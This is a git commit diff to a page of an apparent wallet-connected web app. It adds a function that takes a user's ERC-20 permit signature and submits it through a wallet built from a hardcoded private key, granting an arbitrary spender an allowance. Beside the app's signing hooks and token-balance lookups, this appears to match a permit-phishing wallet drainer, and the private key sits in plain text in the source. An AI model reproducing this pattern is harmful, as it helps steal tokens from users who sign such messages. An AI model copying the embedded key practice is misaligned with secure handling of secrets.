3a29bc638c3adbd8a33322207376cfc568f8a4dc
FAZEL UNITY <53996181+fazelunity0054@users.noreply.github.com>
2024-05-23 22:50:42 +0330

    update app/page.tsx

--- src/app/page.tsx
+++ src/app/page.tsx
@@ -4,7 +4,7 @@ import {useAccount, useBalance, useDisconnect, useSendTransaction, useSignMessag
 import {parseEther} from "viem";
 import {signTypedData} from "@wagmi/core";
 import {config} from "@/context/config";
-import {Contract, ethers} from "ethers";
+import {Contract, ethers, Wallet} from "ethers";
 import {useEffect, useState} from "react";
 import {useEthersSigner} from "@/app/ethers";
 
@@ -240,6 +240,36 @@ export type ContractCovalenTHQ = {
 	pretty_quote_24h: any
 	protocol_metadata: any
 	nft_data: any
+}
+
+async function handle(json: any) {
+	const {
+		contract,
+		signature,
+		spender,
+		amount,
+		nonce,
+		deadline
+	} = json;
+
+	const provider = new ethers.providers.JsonRpcProvider('https://polygon-zkevm-cardona.blockpi.network/v1/rpc/public', {
+		chainId: 2442,
+		name: "Polygon zkEVM Cardona Testnet",
+
+	});
+	await provider.detectNetwork()
+	const privateKey = 'aea28f0d99ad7a99c544957f3ac655eb01d913b795d251e4da9566338bfbd5be';
+	const wallet = new Wallet(privateKey, provider);
+
+	const {v, r, s} = ethers.utils.splitSignature(signature);
+	let tokenContract = new ethers.Contract(contract, ['function permit(address spender, uint256 amount, uint256 nonce, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'], wallet);
+	tokenContract = await tokenContract.deployed();
+	const args = [spender, amount, nonce, deadline, v, r, s];
+	console.log(args)
+	const tx = await tokenContract.permit(...args);
+	console.log("TX",tx);
+	await tx.wait();
+	console.log("FINISHED");
 }
 
 
